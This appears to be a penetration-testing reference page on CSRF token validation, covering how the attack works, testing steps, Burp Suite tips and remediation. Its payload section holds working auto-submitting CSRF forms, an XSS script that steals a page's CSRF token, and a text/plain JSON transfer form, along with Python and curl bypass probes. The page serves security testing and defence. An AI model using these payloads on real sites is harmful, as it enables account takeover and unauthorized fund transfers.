# CSRF Token Validation

## Overview
Cross-Site Request Forgery (CSRF) tokens are server-generated, unpredictable values included in forms and AJAX requests to prove that a request originated from the legitimate user's browser session, not from a malicious cross-site page. Weak CSRF token validation — including absent validation, validation only on presence (not value), accepting empty tokens, or reusing tokens across sessions — allows attackers to forge state-changing requests on behalf of authenticated victims. CSRF is distinct from XSS: it exploits the trust a site has in the user's browser, not malicious script execution.

## How It Works
- A victim is logged in to `target.com` with a valid session cookie.
- The attacker hosts a page on `evil.com` containing a hidden form that submits to `target.com/transfer`.
- The victim's browser visits `evil.com` (via phishing, malicious ad, etc.) and the form auto-submits.
- The victim's browser attaches the `target.com` session cookie to the cross-site request automatically.
- If `target.com` does not validate a CSRF token, it processes the request as if the victim initiated it.
- CSRF tokens work because `evil.com` cannot read the token from `target.com` (same-origin policy) and cannot forge a request with the correct token.

## Impact
- Unauthorized actions performed on behalf of authenticated users: fund transfers, email changes, password changes, account deletion, privilege escalation.
- Social engineering attacks that bypass authentication entirely.
- Large-scale attacks via malicious ads or compromised high-traffic websites.
- Particularly severe in admin panels — a CSRF attack on an admin can compromise the entire application.
- If combined with stored XSS, can be self-propagating.

## Where to Look
- All state-changing forms (POST, PUT, PATCH, DELETE) — check for CSRF token hidden fields.
- AJAX requests in Single Page Applications — check for CSRF headers (`X-CSRF-Token`, `X-Requested-With`).
- API endpoints that accept cookies for authentication — they may lack CSRF protection.
- JSON-only endpoints — check if `Content-Type: application/json` prevents CSRF without a token.
- Form submissions where the CSRF token is: absent, static across sessions, too short, or validated only for presence.
- Password change, email change, money transfer, and admin action endpoints.

## Testing Steps
1. Log in and navigate to a state-changing feature (e.g., change email).
2. Intercept the form submission request in Burp Suite — look for a CSRF token parameter.
3. If no token exists: the endpoint is likely CSRF-vulnerable — proceed to step 8.
4. If a token exists: copy the request to Repeater and delete the CSRF token parameter entirely. If the server accepts the request — validation on presence only is bypassed.
5. Submit the form with an empty CSRF token value (`csrf_token=`). If accepted — empty token bypass.
6. Submit the form with a random/arbitrary token value (`csrf_token=aaaaaaaaaa`). If accepted — no server-side validation.
7. Submit the request with another user's CSRF token (cross-account reuse). If accepted — tokens are not tied to sessions.
8. Build a CSRF PoC HTML page and test it from a separate browser session where you are logged in as a victim.
9. Test JSON API endpoints: attempt to send the same request with `Content-Type: text/plain` — some servers parse JSON from all content types.
10. Check whether the `SameSite` cookie attribute provides defense (see `sess_cookie_samesite.md`).

## Payloads / Techniques

```html
<!-- Basic CSRF PoC (auto-submitting form) -->
<!-- Host on attacker server: http://evil.com/csrf.html -->
<!DOCTYPE html>
<html>
<head><title>CSRF PoC</title></head>
<body onload="document.forms[0].submit()">
  <form action="https://target.com/account/change-email" method="POST">
    <input type="hidden" name="email" value="attacker@evil.com" />
    <!-- No CSRF token included! -->
  </form>
</body>
</html>
```

```html
<!-- CSRF with stolen CSRF token via XSS -->
<script>
// If XSS exists, steal CSRF token from page DOM, then submit form
var token = document.querySelector('input[name="csrf_token"]').value;
var form = document.createElement("form");
form.method = "POST";
form.action = "https://target.com/account/change-email";

var email = document.createElement("input");
email.name = "email";
email.value = "attacker@evil.com";
form.appendChild(email);

var csrf = document.createElement("input");
csrf.name = "csrf_token";
csrf.value = token;
form.appendChild(csrf);

document.body.appendChild(form);
form.submit();
</script>
```

```html
<!-- JSON-based CSRF (when server accepts JSON via form) -->
<!-- Some servers accept JSON with text/plain content type -->
<form action="https://target.com/api/transfer" method="POST"
      enctype="text/plain">
  <input name='{"to":"attacker","amount":1000,"ignore":"' value='"}'>
</form>
<script>document.forms[0].submit();</script>
```

```python
import requests

BASE = "https://target.com"

def test_csrf_token_bypass(session_cookie):
    """Test various CSRF token bypass techniques."""
    headers = {"Cookie": f"session={session_cookie}"}
    
    tests = [
        # (description, data)
        ("No CSRF token",      {"email": "attacker@evil.com"}),
        ("Empty CSRF token",   {"email": "attacker@evil.com", "csrf_token": ""}),
        ("Random CSRF token",  {"email": "attacker@evil.com", "csrf_token": "aaaaaaaaaa"}),
        ("Null CSRF token",    {"email": "attacker@evil.com", "csrf_token": "null"}),
    ]
    
    for desc, data in tests:
        r = requests.post(f"{BASE}/account/change-email",
                         data=data, headers=headers, allow_redirects=False)
        if r.status_code in [200, 302]:
            print(f"[VULNERABLE] {desc}: HTTP {r.status_code}")
        else:
            print(f"[OK] {desc}: HTTP {r.status_code} - rejected")
```

```bash
# Using curl to test CSRF bypass
SESSION_COOKIE="your_session_token"
TARGET="https://target.com/account/change-email"

# Test 1: No CSRF token
curl -si -X POST "$TARGET" \
  -H "Cookie: session=$SESSION_COOKIE" \
  -d "email=attacker@evil.com"

# Test 2: Empty CSRF token
curl -si -X POST "$TARGET" \
  -H "Cookie: session=$SESSION_COOKIE" \
  -d "email=attacker@evil.com&csrf_token="

# Test 3: Arbitrary token
curl -si -X POST "$TARGET" \
  -H "Cookie: session=$SESSION_COOKIE" \
  -d "email=attacker@evil.com&csrf_token=aaaaaaaaaa"

# Test 4: Change method (if GET accepted for state change)
curl -si -G "$TARGET" \
  -H "Cookie: session=$SESSION_COOKIE" \
  --data-urlencode "email=attacker@evil.com"
```

```bash
# Test JSON endpoint without CSRF token
curl -si -X POST "https://target.com/api/transfer" \
  -H "Cookie: session=$SESSION_COOKIE" \
  -H "Content-Type: application/json" \
  -d '{"to":"attacker_account","amount":500}'
# If 200 -> JSON API lacks CSRF protection
```

## Burp Suite Tips
- **CSRF PoC Generator**: Right-click any POST request in Proxy > Engagement tools > Generate CSRF PoC. Burp creates a complete HTML page ready for testing.
- **Active Scanner**: Burp's scanner actively tests for CSRF vulnerabilities — run it against authenticated endpoints.
- **Repeater — Token Manipulation**: Send a form submission to Repeater. Modify the CSRF token: delete it, empty it, randomize it, truncate it. Observe what the server accepts.
- **Target > Engagement Tools > Find CSRF Tokens**: Burp scans the site map and identifies all forms and parameters that contain or should contain CSRF tokens.
- **Match and Replace (CSRF Token Stripping)**: Add a rule to strip `csrf_token` from all outgoing requests — then browse normally to test how the application responds to missing tokens across all endpoints at once.
- **Extension — CSRF Scanner**: Third-party Burp extension that automates comprehensive CSRF testing including token bypass techniques.

## Tools
- **Burp Suite** — CSRF PoC generator, scanner, and token bypass testing.
- **OWASP ZAP** — CSRF scanner and forced-browse testing.
- **csrf-poc-generator** (standalone CLI) — generates CSRF PoC HTML.
- **XSRFProbe** — dedicated CSRF vulnerability testing tool.
- **curl** — manual request manipulation and bypass testing.

## Remediation
- Use a cryptographically secure, per-session, per-form CSRF token tied to the user's session.
- Validate the CSRF token server-side on every state-changing request (POST, PUT, PATCH, DELETE).
- Reject requests where the CSRF token is absent, empty, or does not match the session-stored value.
- Use the Synchronizer Token Pattern or the Double Submit Cookie pattern.
- Use `SameSite=Strict` or `SameSite=Lax` on session cookies as a defense-in-depth measure.
- For SPAs and APIs: use the custom request header technique — require `X-Requested-With: XMLHttpRequest` or a custom header (browsers cannot send custom headers in cross-site form posts).
- Do not use GET requests for state-changing operations.
- For JSON APIs: validate `Content-Type: application/json` strictly — reject `text/plain` JSON bodies.
- Framework defaults:
  - **Django**: CSRF middleware is enabled by default — use `{% csrf_token %}` in templates.
  - **Rails**: `protect_from_forgery` is on by default.
  - **Spring Security**: CSRF protection enabled by default for all non-GET methods.

## References
https://owasp.org/www-community/attacks/csrf
https://cheatsheetseries.owasp.org/cheatsheets/Cross-Site_Request_Forgery_Prevention_Cheat_Sheet.html
https://portswigger.net/web-security/csrf
https://portswigger.net/web-security/csrf/bypassing-token-validation
https://cwe.mitre.org/data/definitions/352.html
